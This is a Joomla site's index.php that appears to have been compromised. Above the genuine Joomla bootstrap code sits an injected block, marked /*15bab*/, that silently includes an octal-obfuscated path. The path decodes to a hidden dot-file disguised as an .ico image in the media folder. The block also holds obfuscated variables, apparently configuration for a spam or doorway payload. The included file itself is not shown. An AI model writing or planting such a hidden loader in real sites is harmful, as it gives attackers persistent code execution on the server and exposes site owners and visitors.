<?php
/*15bab*/

@include "\057h\164d\157c\163/\167e\142/\155e\144i\141/\143m\163/\0565\0642\0707\066c\065.\151c\157";

/*15bab*/


//header('Content-Type:text/html; charset=utf-8');
$O__0OO0_0O='impromptu4325';
$O0_OO0O__0=8513;
$O_0_OOO_00='index.php/B-D/C-02.cfm';
$OO__000O_O='';
$O0_O00O__O='ImIJIVIJIwIJKgIGHKwLFGLGFLMFoGFnGFNEFMOL';
$O0_0O0_OO_='thumbnail,servile,give,metallurgy,deletion,lamb,whichever,attribute,surreal,apparent,ammunition,else,clipping,behave,bracketed,talkathon,needlelike,fourscore,malapropism,towards';
$OO00_0_O_O='.';
$O0O_0_0OO_=0;
$O_0O_0O_0O=1;
?>
<?php
/**
 * @package    Joomla.Site
 *
 * @copyright  Copyright (C) 2005 - 2014 Open Source Matters, Inc. All rights reserved.
 * @license    GNU General Public License version 2 or later; see LICENSE.txt
 */

if (version_compare(PHP_VERSION, '5.3.10', '<'))
{
	die('Your host needs to use PHP 5.3.10 or higher to run this version of Joomla!');
}

/**
 * Constant that is checked in included files to prevent direct access.
 * define() is used in the installation folder rather than "const" to not error for PHP 5.2 and lower
 */
define('_JEXEC', 1);

if (file_exists(__DIR__ . '/defines.php'))
{
	include_once __DIR__ . '/defines.php';
}

if (!defined('_JDEFINES'))
{
	define('JPATH_BASE', __DIR__);
	require_once JPATH_BASE . '/includes/defines.php';
}

require_once JPATH_BASE . '/includes/framework.php';

// Mark afterLoad in the profiler.
JDEBUG ? $_PROFILER->mark('afterLoad') : null;

// Instantiate the application.
$app = JFactory::getApplication('site');

// Execute the application.
$app->execute();
